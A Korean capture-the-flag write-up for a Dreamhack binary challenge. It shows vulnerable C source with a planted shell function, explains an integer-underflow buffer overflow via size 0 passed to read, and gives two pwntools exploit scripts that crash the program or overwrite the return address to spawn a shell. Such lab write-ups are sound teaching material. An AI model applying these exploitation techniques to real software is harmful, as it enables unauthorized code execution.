# 바이너리 분석

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

<img width="515" alt="image" src="https://github.com/user-attachments/assets/eddbfb92-622c-416b-bf61-b37b2e5b7bf7">

먼저 바이너리를 살펴보면, `32-bit` 시스템이며, `canary`, `PIE`, `RELRO` 등 보호 기법이 거의 존재하지 않아서 `RAO`, `GOTO` 등 대부분의 공격이 가능하다. 그러니 일단 소스 코드를 한번 파악해보자.

`get_shell` 함수가 바이너리에 존재하기 때문에 결론적으로 이 함수를 수행해야 한다.

그런데 아래를 잘보면, `signal(SIGSEGV, get_shell);` 코드가 존재하기 때문에 `SegFault`가 발생하면 `signal` 함수를 통해 `get_shell`을 수행할 수 있기 때문에, 따로 `RAO`를 해줄 필요는 없다. 

***위 코드의 원형은 `sighandler_t signal(int signum, sighandler_t handler);`으로,  `signum`에 해당하는 시그널이 발생하는 경우 `handler` 함수를 수행하는 코드이다.***

그럼 이제 `SegFault`를 발생시키도록 `BOF`가 존재하는지 살펴보자. (사실 다른 방법으로, `NO PIE`이기 때문에 `BOF` 취약점과 `RAO` 공격을 통해 `get_shell`의 주소를 gdb에서 찾아서 대입해도 된다.)

```
scanf("%d", &size);

if (size > 256 || size < 0)
{
    printf("Buffer Overflow!\n");
    exit(0);
}
```

위 부분을 살펴보자. 사용자에게 `size`를 입력받는데, `256`보다 크거나 `0`보다 작으면 바이너리를 종료시킨다. 

처음에는 큰 양수값을 넣어서 `BOF`를 발생시키거나, 음수 값을 넣어서 `BOF`를 발생시킬 수 없는게 아닌가라는 생각이 드는데,

잘 보면, `size == 0`인 경우는 조건을 통과하고, 바로 아래에서 `read(0, buf, size - 1);`를 통해 `size - 1` 크기의 입력을 받게 된다.

`size == 0`인 경우 `size - 1 == -1`이고, `read`에서 입력 크기에 대한 인자 타입은 `size_t`이기 때문에 `-1`인 `0xffffffff`를 `Umax`로 해석하게 되어 `BOF`를 발생시킬 수 있다.

따라서, `BOF`를 통해 가장 쉽게는 `main`의 `Return address`를 `0x414141..`와 같은 존재하지 않는 주소로 덮어서 `Segfault`를 발생시키거나, `Return Address`의 위치를 찾아서 gdb로 찾은 `get_shell`의 주소를 대입해줘도 된다.

그럼 일단 `gdb`를 통해 입력 받는 `buf`의 위치가 `ebp`와 얼마나 떨어져 있는지 확인해보자.

`buf`를 인자로 가지는 `read`에 중단점을 걸어서 `buf`의 주소를 찾아볼 수 있고, `buf`와 `ebp` 주소의 차이를 구해보면 `buf`의 크기와 같은 `256`이라는 것을 알 수 있다.

<img width="450" alt="image" src="https://github.com/user-attachments/assets/b50f853b-7a37-40d2-98b8-a2f29d3edbf2">

<img width="297" alt="image" src="https://github.com/user-attachments/assets/dbd4d0d0-0610-4882-aa22-5ff109e6752a">

따라서, `buf`의 크기에 해당하는 `256bytes`를 덮고, `ebp = sfp`의 크기에 해당하는 `4bytes`를 덮고, `return_address`를 존재하지 않는 값으로 덮기 위해 `b'aaaa'`를 전달해준다. (`b'a'`만 전달해서 `261bytes`만 전달해줘도 되긴 한다.)

### 참고

`32-bit` 시스템에서는 함수 호출 규약에서 인자를 `stack`으로 전달하기 때문에 `read`의 첫 번째 인자는 `0`, 두 번째 인자는 `buf`, 세 번째 인자는 `size - 1`임을 통해 아래와 같이 어셈블리 코드로도 `buf`가 `ebp - 0x100`에 존재한다는 것을 알 수 있다.

1. `size`가 `[ebp - 0x104]`에 저장되어 있기 때문에 `eax`에 옮기고 `sub`로 `-1`을 해준 후 `push eax`

2. `buf`가 `[ebp - 0x100]`에 저장되어 있기 때문에 `eax`에 옮기고 `push eax`

3. 첫 번째 인자인 `fd`는 `eax`를 `0`으로 만든 후 `push eax`

<img width="467" alt="image" src="https://github.com/user-attachments/assets/67e323d9-f184-472f-a13c-895b6b26d74f">

# Exploit 1. `BOF`를 통한 `Segfault` 발생 : `ex_bof.py`

```
from pwn import *

p = remote('host3.dreamhack.games', 19837)

p.sendlineafter(b'Size: ', b'0')
p.sendafter(b'Data: ', b'a' * 264)

p.interactive()
```

# Exploit 2. `BOF`와 `RAO`를 통한 `get_shell` 실행

<img width="522" alt="image" src="https://github.com/user-attachments/assets/5af854a6-45d8-4b36-af98-415553ee6e80">

```
from pwn import *

p = remote('host3.dreamhack.games', 23619)

p.sendlineafter(b'Size: ', b'0')

payload = b'a' * 260
payload += p32(0x8048659)

p.sendafter(b'Data: ', payload)

p.interactive()
```







